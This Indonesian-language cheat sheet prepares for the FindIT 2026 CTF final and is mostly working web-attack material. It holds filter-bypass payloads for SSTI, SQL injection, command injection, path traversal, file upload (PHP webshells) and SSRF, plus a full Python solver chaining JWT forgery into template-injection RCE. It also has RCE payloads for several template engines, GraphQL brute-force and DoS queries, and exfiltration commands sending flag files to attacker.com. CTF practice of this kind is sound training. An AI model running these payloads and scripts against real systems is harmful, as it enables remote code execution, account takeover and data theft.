# CTF FindIT 2026 Final — Web Exploitation Advanced Reference

> Lanjutan dari megaprompt utama. Dokumen ini menjawab 5 pertanyaan terakhir secara teknis, dengan fokus pada teknik manual (tanpa automation scanner) sesuai aturan kompetisi.

---

## 1. WAF / Filter Bypass Payloads (Per Technique)

### 1.1 SSTI Bypass — saat keyword diblokir

Filter umum: `__class__`, `__globals__`, `os`, `popen`, `import`, `system`, `subprocess`, `{{`, `}}`, quotes.

#### Bypass via attribute access alternatif
```jinja2
# Daripada __class__ langsung, pakai |attr() atau ["..."]
{{ ''|attr('__class__') }}
{{ ''["__class__"] }}
{{ request|attr('application') }}
```

#### Bypass via concat string (jika kata `os`/`popen` di-blacklist)
```jinja2
{{ lipsum.__globals__['o'+'s'].popen('id').read() }}
{{ lipsum.__globals__['os'|reverse|reverse].popen('id').read() }}
{{ lipsum["__glo"+"bals__"]["os"]["po"+"pen"]("id").read() }}
```

#### Bypass via hex / octal escape (Python source-level)
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('eval')('__import__("os").popen("id").read()') }}
```

#### Bypass kalau `{{` `}}` diblokir → pakai `{% %}`
```jinja2
{% if lipsum.__globals__.os.popen("id").read() %}1{% endif %}

# Atau via {%set%} kalau output di-render kembali
{%set x=lipsum.__globals__.os.popen("id").read()%}{{x}}
```

#### Bypass kalau quotes dihapus
```jinja2
# Pakai request.args / request.values untuk pass quoted string via parameter
{{ request|attr(request.args.a)|attr(request.args.b) }}
# Lalu kirim: ?a=__class__&b=__mro__
```

#### Bypass kalau `.` (dot) difilter
```jinja2
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
```

#### Bypass length limit (kependekan namespace)
```jinja2
# `lipsum` (6 char) lebih pendek dari `cycler` atau `joiner`
# `g` (Flask global) sangat pendek tapi terbatas
{{ self|attr('_TemplateReference__context')|attr('cycler')|attr('__init__')|attr('__globals__')|attr('os')|attr('popen')('id')|attr('read')() }}
```

### 1.2 SQL Injection Bypass

#### Spasi diblokir
```sql
'/**/OR/**/1=1--
'%0aOR%0a1=1--          # newline
'%09OR%091=1--          # tab
'+OR+1=1--              # plus
'(OR)(1=1)--            # paren padding
```

#### Keyword `OR` / `AND` diblokir
```sql
'||'1'='1               # logical OR (MySQL/Oracle string concat trick)
'&&'1'='1               # MySQL AND (di URL encode jadi %26%26)
' || (SELECT 1)='1
```

#### `UNION SELECT` diblokir
```sql
UnIoN sElEcT             # case bypass
UNION/*!50000SELECT*/    # MySQL inline comment with version
UNION(SELECT(1),(2))     # paren padding tanpa spasi
```

#### Quote diblokir
```sql
# Pakai hex untuk string literal
0x61646d696e            # = 'admin'
SELECT * FROM users WHERE username=0x61646d696e

# CHAR()
CHAR(97,100,109,105,110)  # = 'admin'
```

#### Comment diblokir
```sql
# Akhiri dengan kondisi tautologi tanpa comment
' OR '1'='1
" OR "1"="1
```

#### Double encoding (jika URL decode dilakukan dua kali oleh middleware)
```
%2527 → %27 → '
%2522 → %22 → "
```

#### Bypass `information_schema` blocked (MySQL ≥ 5.7)
```sql
# Pakai sys.x$schema_table_statistics
UNION SELECT table_name,NULL FROM sys.x$schema_table_statistics
# Atau mysql.innodb_table_stats
UNION SELECT table_name,NULL FROM mysql.innodb_table_stats
```

### 1.3 Command Injection Bypass

#### Spasi diblokir
```bash
{cat,/etc/passwd}                  # brace expansion
cat${IFS}/etc/passwd              # IFS variable
cat$IFS$9/etc/passwd              # IFS$9 trick
cat</etc/passwd                   # input redirection
X=$'cat\x20/etc/passwd';$X        # ANSI-C quoting
```

#### Slash `/` diblokir
```bash
${PATH:0:1}etc${PATH:0:1}passwd   # /etc/passwd dari $PATH
${HOME:0:1}etc${HOME:0:1}passwd
```

#### Keyword (`cat`, `ls`, `id`) diblacklist
```bash
c'a't /etc/passwd                 # quote splitting
c\at /etc/passwd                  # backslash splitting
"c"a"t" /etc/passwd
$'\x63\x61\x74' /etc/passwd       # hex escape
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh
$(printf '\x63\x61\x74') /etc/passwd
which$IFS\$'\u200B'cat            # zero-width unicode
```

#### Karakter pemisah (`;`, `|`, `&`) diblokir
```bash
cmd1`cmd2`           # backtick
cmd1$(cmd2)          # subshell
cmd1\ncmd2           # newline (URL: %0a)
cmd1%0acmd2
```

#### Output exfil saat blind
```bash
# DNS exfil
$(cat /flag.txt|head -c20).attacker.com   # cek query log DNS
nslookup `cat /flag.txt|base64`.attacker.com

# HTTP exfil
curl http://attacker.com/?d=$(cat /flag.txt|base64 -w0)
wget http://attacker.com/$(id|base64 -w0)
```

### 1.4 Path Traversal Bypass

#### `../` di-strip oleh sanitizer (single-pass replace)
```
....//....//etc/passwd            # double-traversal jadi ../ setelah strip
..././..././etc/passwd
....\/....\/etc/passwd
```

#### URL encoding berlapis
```
..%2f..%2fetc%2fpasswd            # single
..%252f..%252fetc%252fpasswd      # double encode
..%c0%af..%c0%afetc%c0%afpasswd   # UTF-8 overlong (lama)
```

#### Whitelist extension (`.jpg`, `.png`)
```
?file=../../etc/passwd%00.jpg     # null byte (PHP < 5.3.4)
?file=../../etc/passwd#.jpg       # fragment trick (kadang)
?file=../../etc/passwd?.jpg       # query trick
```

#### Path normalization tricks
```
?file=/etc/./passwd
?file=/etc//////passwd
?file=/var/www/../../etc/passwd
?file=//....//....//etc/passwd
```

### 1.5 File Upload Bypass

#### Magic byte polyglot (GIF87a header + PHP)
```bash
# File: shell.gif (atau .png/.jpeg sesuai header)
printf 'GIF87a\n<?php system($_GET["c"]); ?>\n' > shell.gif
# Lalu rename ke .php / .phtml / .phar / .pht setelah upload
```

#### `.htaccess` upload (Apache)
```apache
# upload sebagai .htaccess di folder upload
AddType application/x-httpd-php .jpg
# Lalu shell.jpg dieksekusi sebagai PHP
```

#### Double extension
```
shell.php.jpg           # kadang Apache parse balik
shell.jpg.php
shell.php%00.jpg        # null byte
shell.php;.jpg          # IIS 6 trick
shell.asp;.jpg          # IIS
```

#### MIME type spoof (di Burp Repeater)
```
Content-Type: image/jpeg     # padahal isi PHP
Content-Disposition: form-data; name="file"; filename="shell.php"
```

#### Race condition (file divalidasi setelah upload, sebelum dihapus)
```python
import threading, requests
URL_UPLOAD = "http://target/upload"
URL_FILE   = "http://target/uploads/shell.php"

def upload():
    requests.post(URL_UPLOAD, files={"f": ("shell.php", "<?php system($_GET[c]);?>")})

def access():
    while True:
        r = requests.get(URL_FILE + "?c=id")
        if r.status_code == 200 and "uid=" in r.text:
            print(r.text); break

threading.Thread(target=access, daemon=True).start()
for _ in range(50): upload()
```

### 1.6 SSRF Bypass

#### Filter `127.0.0.1` / `localhost`
```
http://127.1/                       # short
http://0/                           # 0.0.0.0
http://0177.0.0.1/                  # octal
http://0x7f.0x0.0x0.0x1/            # hex
http://2130706433/                  # decimal
http://[::1]/                       # IPv6
http://[::ffff:127.0.0.1]/          # IPv4-mapped IPv6
http://localhost.localdomain/
http://customer1.app.localhost.my.domain.com/  # subdomain trick
```

#### Filter blacklist domain
```
http://evil.com@127.0.0.1/          # @ trick (parsed as userinfo)
http://127.0.0.1#@evil.com/         # fragment vs auth confusion
http://google.com.evil.com/         # subdomain trick
```

#### Filter pakai DNS resolution sekali, fetch terpisah (TOCTOU)
```python
# Setup DNS rebinding: domain rebind ke 127.0.0.1 setelah TTL pendek
# Pakai layanan: rbndr.us atau buat sendiri
# rebind-127.0.0.1-1.1.1.1.rbndr.us
```

#### Protocol smuggling
```
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20a%20b%0d%0a   # Redis
gopher://127.0.0.1:25/_HELO%20a%0d%0aMAIL%20FROM:...       # SMTP
file:///etc/passwd                  # local file (kadang work)
dict://127.0.0.1:11211/stats        # memcached
ldap://127.0.0.1/
```

---

## 2. Complete Python Solver — JWT Login + SSTI Chain

### 2.1 Skenario

> Web app dengan login berbasis JWT. Endpoint `/admin` hanya bisa diakses jika `role=admin` di payload JWT. Source code (bocor via `.git`) menunjukkan endpoint admin merender Jinja2 template dari user input → SSTI.

**Strategi multi-step:**
1. Recon: cek `/login`, dapatkan JWT format guest
2. Privilege escalation JWT (3 jalur: alg=none → weak secret bruteforce → kid path traversal)
3. Akses `/admin/preview` dengan token admin
4. Eksploitasi SSTI untuk RCE → baca `/flag.txt`

### 2.2 Full Solver

```python
#!/usr/bin/env python3
"""
FindIT CTF 2026 — Generic JWT + SSTI Chain Solver
Author: prep notes
"""
import requests, base64, json, hmac, hashlib, re, sys, time

BASE = "http://challctf.find-it.id:PORT"   # ganti
GUEST = ("guest", "guest")
FLAG_RX = re.compile(r"FindITCTF\{[^}]+\}")

# ===== JWT helpers (no jwt library — full manual) =====
def b64u_enc(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64u_dec(s):
    s += "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s)

def jwt_parse(t):
    h, p, s = t.split(".")
    return json.loads(b64u_dec(h)), json.loads(b64u_dec(p)), s

def jwt_make(header, payload, secret=b""):
    h = b64u_enc(json.dumps(header, separators=(",", ":")))
    p = b64u_enc(json.dumps(payload, separators=(",", ":")))
    msg = f"{h}.{p}".encode()
    alg = header.get("alg", "").upper()
    if alg in ("NONE", ""):
        return f"{h}.{p}."
    if alg == "HS256":
        sig = hmac.new(secret if isinstance(secret, bytes) else secret.encode(),
                       msg, hashlib.sha256).digest()
        return f"{h}.{p}.{b64u_enc(sig)}"
    raise ValueError(f"alg {alg} not implemented manually")

# ===== Step 1: login as guest =====
sess = requests.Session()
r = sess.post(f"{BASE}/login", json={"username": GUEST[0], "password": GUEST[1]})
print(f"[*] /login → {r.status_code}")

# token bisa di body, header Authorization, atau cookie — coba semua
guest_token = None
try:
    guest_token = r.json().get("token") or r.json().get("access_token")
except Exception: pass
if not guest_token:
    auth = r.headers.get("Authorization", "")
    if auth.startswith("Bearer "): guest_token = auth.split(" ", 1)[1]
if not guest_token:
    for c in ("session", "jwt", "auth", "token"):
        if c in sess.cookies: guest_token = sess.cookies[c]; break
assert guest_token, "Tidak nemu JWT setelah login"
print(f"[+] Guest token: {guest_token[:60]}…")

header, payload, sig = jwt_parse(guest_token)
print(f"[+] Header  : {header}")
print(f"[+] Payload : {payload}")

ADMIN_PAYLOAD = {**payload, "role": "admin", "is_admin": True}
ADMIN_PAYLOAD.pop("exp", None)  # opsional: hapus expiry biar aman

def try_token(token, label):
    r = sess.get(f"{BASE}/admin",
                 headers={"Authorization": f"Bearer {token}"},
                 cookies={"session": token})
    ok = r.status_code == 200 and "forbidden" not in r.text.lower()
    print(f"[{('+' if ok else '-')}] {label:35s} → {r.status_code}")
    return r if ok else None

# ===== Step 2A: alg=none =====
forged = jwt_make({**header, "alg": "none"}, ADMIN_PAYLOAD)
admin_resp = try_token(forged, "alg=none bypass")
admin_token = forged if admin_resp else None

# ===== Step 2B: weak secret bruteforce (small list, no automation) =====
if not admin_token and header.get("alg", "").upper() == "HS256":
    candidates = [
        "secret", "password", "admin", "key", "jwt", "supersecret",
        "changeme", "default", "test", "qwerty", "findit", "ctf",
        "findit2026", "cookiemonster123", "demacia", "ugm",
    ]
    expected_msg = f"{guest_token.split('.')[0]}.{guest_token.split('.')[1]}".encode()
    expected_sig = b64u_dec(sig)
    for c in candidates:
        if hmac.new(c.encode(), expected_msg, hashlib.sha256).digest() == expected_sig:
            print(f"[+] HS256 secret found: {c!r}")
            forged = jwt_make(header, ADMIN_PAYLOAD, secret=c)
            admin_resp = try_token(forged, f"weak secret {c!r}")
            if admin_resp: admin_token = forged
            break

# ===== Step 2C: kid path traversal (file content jadi key) =====
if not admin_token and "kid" in header:
    kid_targets = [
        ("../../../dev/null", b""),
        ("/dev/null", b""),
        ("../../../../etc/hostname", None),  # unknown content
        ("../../../proc/sys/kernel/randomize_va_space", b"2\n"),
        # known files (dari recon source code)
        (".backup/legacy.key", b""),
        (".backup/secret.key", b""),
    ]
    for kid, key in kid_targets:
        if key is None: continue  # skip yg gak tahu isinya
        forged = jwt_make({**header, "kid": kid, "alg": "HS256"},
                          ADMIN_PAYLOAD, secret=key)
        admin_resp = try_token(forged, f"kid={kid}")
        if admin_resp: admin_token = forged; break

assert admin_token, "Semua jalur JWT escalation gagal — review source lagi"
print(f"\n[++] Admin token achieved: {admin_token[:60]}…\n")

# ===== Step 3: SSTI via /admin/preview?template=... =====
SSTI_PAYLOADS = [
    # Klasik
    '{{lipsum.__globals__.os.popen("cat /flag.txt").read()}}',
    # Filter dropping `__`
    '{{lipsum["__glo"+"bals__"]["os"]["po"+"pen"]("cat /flag.txt").read()}}',
    # Via config
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
    # Via request
    "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}",
    # Via |attr() kalau . diblok
    "{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag.txt')|attr('read')()}}",
    # Static drop pattern (dari Demacia Shield)
    '{{lipsum.__globals__.os.popen("cp /flag.txt /app/static/x.txt").read()}}',
]

for ssti in SSTI_PAYLOADS:
    r = sess.get(f"{BASE}/admin/preview",
                 params={"template": ssti},
                 headers={"Authorization": f"Bearer {admin_token}"},
                 cookies={"session": admin_token})
    print(f"[*] SSTI try: {ssti[:60]}… → {r.status_code} ({len(r.text)}B)")
    flags = FLAG_RX.findall(r.text)
    if flags:
        print(f"\n[FLAG] {flags[0]}")
        sys.exit(0)
    # cek static drop
    if "static/x.txt" in ssti:
        rr = sess.get(f"{BASE}/static/x.txt")
        flags = FLAG_RX.findall(rr.text)
        if flags: print(f"\n[FLAG via static] {flags[0]}"); sys.exit(0)

# ===== Step 4: blind SSTI fallback (time-based detection) =====
print("\n[!] Tidak nemu flag langsung — coba blind detection")
t0 = time.time()
sess.get(f"{BASE}/admin/preview",
         params={"template": '{{lipsum.__globals__.os.popen("sleep 3").read()}}'},
         headers={"Authorization": f"Bearer {admin_token}"})
delta = time.time() - t0
print(f"[*] Sleep test → {delta:.2f}s {'(SSTI confirmed blind)' if delta>2.5 else '(no SSTI)'}")
```

### 2.3 Variations & Notes

- Kalau JWT pakai **RS256** dan ada hint public key bocor → coba **alg confusion RS256→HS256** (sign HS256 pakai public key sebagai secret).
- Kalau token bukan JWT melainkan **Flask session signed cookie** → pakai `flask-unsign` (offline tool, diperbolehkan karena bukan scanner) atau script manual itsdangerous brute force.
- Kalau `/admin/preview` POST instead of GET → ubah `sess.get` → `sess.post(... json={"template": ssti})`.
- Untuk SSTI via **error message** (kalau template dirender saat exception) → trigger exception sengaja: `{{ 1/0 }}`, baca traceback.

---

## 3. SSTI Engine Comparison: Jinja2 vs Twig vs FreeMarker

### 3.1 Detection Payloads (jalankan bertahap)

| Payload          | Jinja2 | Twig  | FreeMarker | Pebble | Velocity | ERB | Smarty |
|------------------|--------|-------|------------|--------|----------|-----|--------|
| `{{7*7}}`        | 49     | 49    | error      | 49     | error    | err | varies |
| `${7*7}`         | err    | err   | 49         | err    | 49       | err | err    |
| `<%=7*7%>`       | err    | err   | err        | err    | err      | 49  | err    |
| `{7*7}`          | err    | err   | err        | err    | err      | err | 49     |
| `{{7*'7'}}`      | 7777777| 49    | err        | 49     | err      | err | err    |
| `${"a".toString()}` | err | err | a          | err    | a        | err | err    |
| `#{7*7}`         | err    | err   | err        | err    | 49       | err | err    |

**Kunci diferensiasi Jinja2 vs Twig:** `{{7*'7'}}` → Jinja2 melakukan repeat string (Python behavior, `7*'7'='7777777'`); Twig melakukan numeric coercion (`'7'→7, 7*7=49`).

### 3.2 Jinja2 (Python — Flask/Django Jinja2)

```jinja2
# Identifikasi:
{{7*'7'}}                                       # → 7777777
{{ self }}                                      # ada method __repr__ Python

# RCE via lipsum (paling common, terpendek)
{{lipsum.__globals__.os.popen("id").read()}}

# Via config (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via class traversal (kalau lipsum/config/request difilter)
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Cari index `subprocess.Popen` atau `<class 'os._wrap_close'>` lalu:
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}

# File read tanpa OS module
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('/etc/passwd').read() }}   # via <class 'file'> di Py2

# SSTI via {%set%} (kalau {{}} difilter)
{%set x=lipsum.__globals__.os.popen('id').read()%}{{x}}

# Sandbox bypass (Flask SimpleSandboxedEnvironment)
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### 3.3 Twig (PHP — Symfony, Drupal)

```twig
# Identifikasi
{{7*'7'}}                                       # → 49 (numeric coerce)
{{ dump() }}                                    # debug

# RCE klasik (Twig < 1.20 / sandbox bypass)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Via filter `system` (versi lama)
{{['id']|filter('system')}}
{{['id']|map('system')|join}}

# Via getName / getTemplateName chain
{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}

# Modern Twig (≥ 2.x) — sandboxed by default
{{ ['id', '-a']|filter('system') }}            # often blocked
# Coba SSRF / PHP filter chain via include kalau exec direstrict
{% include 'php://filter/convert.base64-encode/resource=/etc/passwd' %}

# Drupal-specific (Twig di Drupal punya extra)
{{['id']|map('passthru')}}
```

### 3.4 FreeMarker (Java — Spring, Struts)

```freemarker
# Identifikasi
${7*7}                                          # → 49
${"freemarker.template.utility.ObjectConstructor"?new()}  # cek class loading

# RCE via Execute utility
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}

# Single-line version
${"freemarker.template.utility.Execute"?new()("id")}

# Kalau "Execute" diblock (versi baru sering disable):
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign dwf=owc?new()("freemarker.template.DefaultObjectWrapperBuilder",2,3,21)>
<#assign ec=dwf.build().newInstance(classloader.loadClass("java.lang.Runtime"))>
${ec.getRuntime().exec("id")}

# JythonRuntime (kalau Jython tersedia)
<#assign value="freemarker.template.utility.JythonRuntime"?new()>
<@value>import os;os.system("id")</@value>

# Via ObjectConstructor (Apache Struts2 OGNL hybrid)
<#assign ow="freemarker.template.utility.ObjectConstructor"?new()>
${ow("java.lang.ProcessBuilder",["id"]).start()}
```

### 3.5 Quick Reference: Engine lain

```
Pebble (Java):
  {{ 'id'.execute() }}                                   # Groovy-like
  {{ {} ['getClass']().forName('java.lang.Runtime')... }}

Velocity (Java):
  #set($e="exp")
  $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")

ERB (Ruby — Rails):
  <%= `id` %>                                            # backtick = exec
  <%= system("id") %>
  <%= IO.popen("id").read %>

Smarty (PHP):
  {php}system("id");{/php}                               # versi sangat lama
  {system("id")}                                         # kadang
  {function name=rce}{shell_exec("id")}{/function}{rce}  # dari template injection guides

Mako (Python):
  <% import os; x=os.popen("id").read() %>${x}
  ${"".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}

Tornado (Python):
  {% import os %}{{os.popen("id").read()}}

Handlebars (Node.js — kalau strict mode off):
  {{#with "constructor"}}
    {{#with split as |a|}}
      {{this.pop}}{{this.push (lookup .. "constructor")}}{{this.pop}}
      {{#with .|string|reverse|reverse as |c|}}{{c}}{{/with}}
    {{/with}}
  {{/with}}
```

---

## 4. GraphQL Exploitation Cheatsheet

### 4.1 Detection — apakah ini GraphQL?

```bash
# Endpoint umum
/graphql /graphiql /api/graphql /v1/graphql /query /api /api/v1/query

# Cek dengan request kosong
curl -X POST http://target/graphql -H "Content-Type: application/json" -d '{"query":"{}"}'
# Response error khas: "Syntax Error: Expected Name, found }"

# Cek metode allow
curl -X GET "http://target/graphql?query={__typename}"
# Banyak server expose GET juga (CSRF risk)
```

### 4.2 Introspection — bocoran schema

```graphql
# Quick sanity check
{ __typename }
# → "Query" / "RootQueryType"

# Full introspection (full schema)
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name } } }
}
```

```bash
# Curl one-liner introspection minimal
curl -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}'  | python3 -m json.tool
```

### 4.3 Bypass kalau introspection di-disable

```graphql
# Field suggestion masih bocor info
{ user { idx } }
# Response: "Did you mean 'id', 'idx_internal'?"
# → kita dapat hint nama field

# GraphiQL/Playground sering tetap accessible meski introspection off
GET /graphiql
GET /__graphql
GET /altair

# Apollo Server: error messages bocor type info
{ foo(bar: 1) }
# → "Cannot query field 'foo' on type 'Query'. Did you mean 'food', 'foobar'?"
```

### 4.4 Vulnerability Vectors

#### 4.4.1 Authorization Bypass / IDOR
```graphql
# Banyak GraphQL implementasi cek auth di Query level, bukan field level
query {
  me { id email }                # public, butuh login
  user(id: 2) { email passwordHash }   # mungkin gak diproteksi per-field
}
```

#### 4.4.2 Injection di Argument (SQL/NoSQL/Command)
```graphql
# SQL injection di argument
{ user(id: "1' OR '1'='1") { name } }
{ search(q: "'; DROP TABLE--") { results } }

# NoSQL injection (MongoDB)
{ user(filter: {id: {"$ne": null}}) { email } }

# Command injection di field yg trigger sistem
mutation { generatePDF(filename: "report; cat /flag.txt") }
```

#### 4.4.3 Batched Query DoS / Auth bypass
```json
[
  {"query": "{ login(user:\"a\",pwd:\"a\")}"},
  {"query": "{ login(user:\"a\",pwd:\"b\")}"},
  {"query": "{ login(user:\"a\",pwd:\"c\")}"}
]
```
Banyak server tidak rate-limit per-batch — efektif untuk brute force.

#### 4.4.4 Alias-based brute force
```graphql
# Satu request, banyak attempt
{
  a: login(user:"admin", pwd:"123")
  b: login(user:"admin", pwd:"password")
  c: login(user:"admin", pwd:"admin")
  d: login(user:"admin", pwd:"qwerty")
}
```

#### 4.4.5 Deeply nested query DoS
```graphql
{ user { friends { friends { friends { friends { friends { id } } } } } } }
# Server tanpa depth limit → resource exhaustion
```

#### 4.4.6 Field duplication amplification
```graphql
{ heavy { x } heavy { x } heavy { x } heavy { x } heavy { x } ... }
# Kalau gak ada query cost analysis → DoS
```

#### 4.4.7 CSRF via GET
```html
<!-- Kalau GraphQL accept GET dengan ?query= -->
<img src="http://target/graphql?query=mutation{deleteAccount}">
```

#### 4.4.8 Mutation discovery via __schema
```graphql
{ __schema { mutationType { fields { name args { name type { name } } } } } }
# Cari mutation `createAdmin`, `setRole`, `resetPassword`, etc.
```

### 4.5 Manual Testing Workflow (Burp Repeater)

1. Send to Repeater request login pertama (POST `/graphql`)
2. Coba `{__typename}` → konfirmasi GraphQL
3. Coba full introspection — kalau diblok, test field suggestion
4. Map semua Query & Mutation
5. Test setiap argument: `null`, `0`, `-1`, `'`, `"$ne":null`, `OR 1=1`
6. Cari field yg leak data (e.g. `users { passwordHash }`, `internalNote`)
7. Test mutation tanpa auth: `mutation { setRole(userId:1, role:"admin") }`

### 4.6 Useful Pentester Queries

```graphql
# Cari sensitive fields
{ __schema { types { name fields { name } } } }
# Filter manual untuk kata "password", "token", "secret", "internal", "admin", "private"

# Cari Mutation berbahaya
{ __schema { mutationType { fields { name } } } }
# Hunt: createUser, updateRole, deleteUser, exportData, runQuery, executeCommand

# Inspect specific type
{ __type(name:"User") { fields { name type { name kind } } } }
```

---

## 5. FindIT CTF Pattern Analysis

### 5.1 Pola Umum yang Konsisten

Berdasarkan challenge sebelumnya (Demacia Shield 2026, cookieMonster 2026, Simple Heist 2025, PixelPlaza 2025):

| Pattern                              | Frekuensi | Contoh                                    |
|--------------------------------------|-----------|-------------------------------------------|
| Klasik vuln dibungkus crypto layer   | TINGGI    | Demacia Shield: SSTI dibalik AES-CBC      |
| Source code disclosure jadi key step | TINGGI    | cookieMonster: secret di `/admin-recipe`  |
| Multi-step chain (≥ 2 vuln)          | TINGGI    | Auth bypass → IDOR → RCE                  |
| Header / kid / alg manipulation      | SEDANG    | cookieMonster JWT kid traversal           |
| Frontend modern (Svelte/React)       | TINGGI    | Demacia Shield Svelte + Vite              |
| Static file drop untuk exfil RCE     | SEDANG    | `cat /flag > /app/static/x.txt`           |
| Rate limit / WAF ringan              | SEDANG    | Bypass via header / encoding              |

### 5.2 Per-Challenge Breakdown

#### Demacia Shield (FindIT 2026 Quals)
- **Tech:** Svelte frontend → AES-CBC encrypted payload → Python Flask + Jinja2
- **Vuln chain:** Captcha solve → reverse AES key derivation (SHA256 of `answer:seed`) → encrypted SSTI ke `/api/analyze` → static file drop
- **Lesson:** Selalu baca frontend JS bundle. Crypto handshake yg kelihatan rumit hampir selalu deterministik dari seed yg kita kontrol.

#### cookieMonster (FindIT 2026 Quals)
- **Tech:** Web app dengan JWT + `kid` header → file-based key resolution
- **Vuln chain:** Source disclosure di `/admin-recipe` (secret = `cookiemonster123`) → forge JWT dengan kid valid → `role=admin`
- **Lesson:** Endpoint dengan nama mencurigakan (`/admin-*`, `/debug`, `/internal`) hampir selalu jalur intended.

#### Simple Heist (FindIT 2025)
- **Pola:** IDOR sederhana + source code disclosure (`.git`, `Dockerfile`)
- **Lesson:** `curl http://target/.git/HEAD` adalah LANGKAH PERTAMA setelah scope diketahui.

#### PixelPlaza (FindIT 2025)
- **Pola:** File upload bypass + business logic (harga negatif / kupon stack)
- **Lesson:** Cek validasi server-side untuk numeric inputs (negatif, overflow, scientific notation `1e10`).

### 5.3 Prediksi & Persiapan untuk Final 2026

Berdasarkan pola di atas, kemungkinan tinggi soal final akan menggabungkan:

1. **Modern frontend → backend obscured comm** (Svelte/React/Vue + custom encryption)
   - Persiapan: latih reverse JS bundle di DevTools; siapkan utility AES-CBC/GCM Python.

2. **JWT / session manipulation dengan twist**
   - Persiapan: hafalkan 5 vektor JWT (none, weak HS256, RS→HS confusion, kid traversal, JKU).

3. **SSTI dengan filter custom** (bukan template engine default plain)
   - Persiapan: latih bypass `__class__`, `__globals__` filter; punya 3 cadangan namespace (lipsum, cycler, joiner).

4. **GraphQL muncul setidaknya 1 soal** (tren 2024-2026)
   - Persiapan: hafal introspection one-liner curl + alias batching.

5. **Source disclosure tetap jadi enabler** (`.git`, `.env`, source map JS, `/api/_internal`)
   - Persiapan: checklist 15 path standar siap di-curl batch.

### 5.4 Quick-Win Checklist Sebelum Mulai Soal Manapun

```bash
# Run dalam 60 detik untuk setiap target
T=http://challctf.find-it.id:PORT
for path in / /robots.txt /sitemap.xml /.git/HEAD /.git/config \
            /.env /backup /admin /api /api/v1 /graphql /graphiql \
            /Dockerfile /docker-compose.yml /package.json \
            /static /uploads /debug /actuator /server-status; do
  echo "=== $path ==="; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "$T$path"
done
```

Endpoint yang return 200 / 403 (bukan 404) = clue layak diinvestigasi manual.

### 5.5 Mental Model untuk 7 Jam Kompetisi

```
Stuck > 30 menit di satu soal? → SWITCH
Stuck > 60 menit total di kategori web? → cek soal forensic/crypto/misc
Selalu submit flag SEGERA setelah dapat (jangan tunggu rapikan writeup)
Catatan kasar di .md selama solve — writeup polos OK, yg penting submit
SCREENSHOT setiap step penting (untuk verifikasi & writeup pasca-final)
JANGAN refactor solver kalau sudah jalan — pindah ke soal berikutnya
Jam 15:30 stop coba soal baru, fokus sapu bersih low-hanging
```

---

## Appendix A — Recon One-Liner Bundle

```bash
#!/bin/bash
# Save sebagai recon.sh, chmod +x, jalankan: ./recon.sh http://challctf.find-it.id:PORT
T="${1:?Usage: recon.sh URL}"
echo "[*] Headers"; curl -sI "$T"
echo "[*] Common paths"
for p in /robots.txt /sitemap.xml /.git/HEAD /.git/config /.env \
         /admin /api /api/v1 /graphql /graphiql /Dockerfile \
         /package.json /backup /debug /actuator/env /actuator/heapdump \
         /server-status /.well-known/security.txt; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$T$p")
  [ "$code" != "404" ] && echo "  $code $p"
done
echo "[*] Tech fingerprint"
curl -s "$T" | grep -oiE '(react|vue|svelte|angular|jquery|bootstrap|webpack|vite)' | sort -u
echo "[*] JS bundles"
curl -s "$T" | grep -oE '(/[^" ]+\.js)' | sort -u | head -20
```

## Appendix B — Burp Repeater Power-Tips

- **Ctrl+R** dari Proxy History → Repeater
- **Ctrl+Shift+I** auto-indent JSON/XML response
- **Ctrl+U** URL-encode selection
- **Ctrl+Shift+U** URL-decode selection
- **Ctrl+B** Base64 encode selection
- **Ctrl+Shift+B** Base64 decode selection
- Klik kanan response → **Show response in browser** untuk lihat HTML rendered
- Tab **Inspector** → modify cookies/headers tanpa edit raw
- **Ctrl+Space** → autocomplete header names

---

